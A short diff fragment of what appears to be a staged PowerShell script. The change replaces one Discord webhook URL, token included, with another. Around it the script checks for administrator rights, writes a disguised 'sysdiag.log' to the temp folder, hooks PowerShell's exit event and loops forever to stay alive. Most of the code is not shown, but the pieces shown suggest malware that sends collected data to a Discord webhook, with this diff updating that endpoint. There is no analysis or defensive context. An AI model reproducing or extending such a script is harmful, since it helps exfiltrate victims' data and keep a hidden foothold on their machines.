@@ -10,7 +10,7 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }  
 
 # Stage 2: Environment Setup  
-$webhook = "https://discord.com/api/webhooks/1456244842660233311/wb_kucNwoLvIdZaUNv_Vs0TRRg6mLtv95Fi_5cf1R8NgLz_o5QmCBKrkH8qLoCLX7NPL"  
+$webhook = "https://discord.com/api/webhooks/1456561006749810710/bPEqnfULj26f1hc0EUrPmC61ECRPwDZ5NI5sYaGz4b7I-48BfW9vj6EIpH8LVDicH1w2"  
 $tempDir = $env:TEMP  
 $logPath = "$tempDir\sysdiag.log"  
 
@@ -113,3 +113,4 @@ Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
 
 # Keep Alive  
 while($true) { Start-Sleep -Seconds 3600 }  
+
